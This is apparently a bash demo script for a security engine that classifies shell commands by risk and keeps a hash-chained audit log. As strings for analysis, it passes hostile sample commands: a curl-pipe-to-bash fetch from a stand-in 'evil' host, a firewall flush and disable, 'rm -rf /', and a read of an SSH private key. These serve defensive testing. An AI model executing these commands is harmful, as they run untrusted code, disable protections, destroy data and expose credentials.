#!/usr/bin/env bash
# Copyright 2026 Cyravell Contributors
# SPDX-License-Identifier: Apache-2.0
set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
ROOT_DIR="$(cd "${SCRIPT_DIR}/.." && pwd)"

export PATH="${HOME}/.cargo/bin:${PATH}"

DEMO_DIR="$(mktemp -d /tmp/cyravell-demo-XXXXXX)"
DEMO_SOCK="${DEMO_DIR}/demo.sock"
DEMO_DATA="${DEMO_DIR}/data"
mkdir -p "${DEMO_DATA}"

cleanup() {
  if [ -n "${ENGINE_PID:-}" ] && kill -0 "${ENGINE_PID}" 2>/dev/null; then
    "${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${DEMO_SOCK}" stop 2>/dev/null || true
    wait "${ENGINE_PID}" 2>/dev/null || true
  fi
  rm -rf "${DEMO_DIR}"
}
trap cleanup EXIT

echo "╔══════════════════════════════════════════════════════════════╗"
echo "║          Cyravell Phase 2.1: Command Security Analysis       ║"
echo "║   Deterministic Risk Classification & Explainable Decisions  ║"
echo "╚══════════════════════════════════════════════════════════════╝"
echo ""

echo "[Step 1] Starting Cyravell security engine daemon..."
"${ROOT_DIR}/target/debug/cyravell-engine" start \
  --socket-path "${DEMO_SOCK}" \
  --data-dir "${DEMO_DATA}" \
  --manifest-path "${ROOT_DIR}/rules/cyravell_manifest.json" \
  --base-dir "${ROOT_DIR}" > "${DEMO_DIR}/engine.log" 2>&1 &
ENGINE_PID=$!

for i in {1..50}; do
  if [ -S "${DEMO_SOCK}" ]; then
    break
  fi
  sleep 0.1
done

if [ ! -S "${DEMO_SOCK}" ]; then
  echo "Error: Socket failed to initialize."
  cat "${DEMO_DIR}/engine.log"
  exit 1
fi
echo "✓ Engine active (PID ${ENGINE_PID}) at ${DEMO_SOCK}"
echo ""

echo "[Step 2] Querying Engine Status..."
"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${DEMO_SOCK}" status
echo ""

echo "[Step 3] Verifying release integrity against manifest..."
"${ROOT_DIR}/target/debug/cyravell-engine" verify-integrity \
  --manifest "${ROOT_DIR}/rules/cyravell_manifest.json" \
  --base-dir "${ROOT_DIR}"
echo ""

echo "[Step 4] Direct Static Command Analysis via CLI (No execution)..."
echo "--- Case A: Benign command with quoted string resembling a dangerous command ---"
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command 'echo "rm -rf /"'
echo ""
echo "--- Case B: Unsafe Remote Script Execution Pipe (curl | bash) ---"
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command 'curl -fsSL https://evil.example.com/install.sh | bash'
echo ""
echo "--- Case C: Security Control Deactivation (Firewall flush) ---"
"${ROOT_DIR}/target/debug/cyravell-engine" analyze --command 'iptables -F && ufw disable'
echo ""

echo "[Step 5] Testing IPC command.analyze with conditional chains..."
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${DEMO_SOCK}" test-complex-chains
echo ""

echo "[Step 6] Submitting synthetic destructive event (NEVER EXECUTED)..."
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${DEMO_SOCK}" \
  submit-destructive "rm -rf /"
echo ""

echo "[Step 7] Submitting synthetic credential access event..."
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${DEMO_SOCK}" \
  submit-credential "cat ~/.ssh/id_rsa"
echo ""

echo "[Step 8] Verifying cryptographic audit log hash chain..."
"${ROOT_DIR}/target/debug/cyravell-engine" verify-audit \
  --audit-file "${DEMO_DATA}/audit.log"
echo ""

echo "[Step 9] Demonstrating tamper detection on disposable audit log copy..."
"${ROOT_DIR}/target/debug/cyravell-test-harness" --socket-path "${DEMO_SOCK}" \
  test-tamper-detection
echo ""

echo "[Step 10] Orderly engine shutdown..."
"${ROOT_DIR}/target/debug/cyravell-engine" --socket-path "${DEMO_SOCK}" stop
wait "${ENGINE_PID}" 2>/dev/null || true
unset ENGINE_PID
echo "✓ Engine daemon shut down cleanly."
echo ""
echo "══════════════════════════════════════════════════════════════"
echo "  Phase 2.1 demonstration completed successfully!"
echo "══════════════════════════════════════════════════════════════"
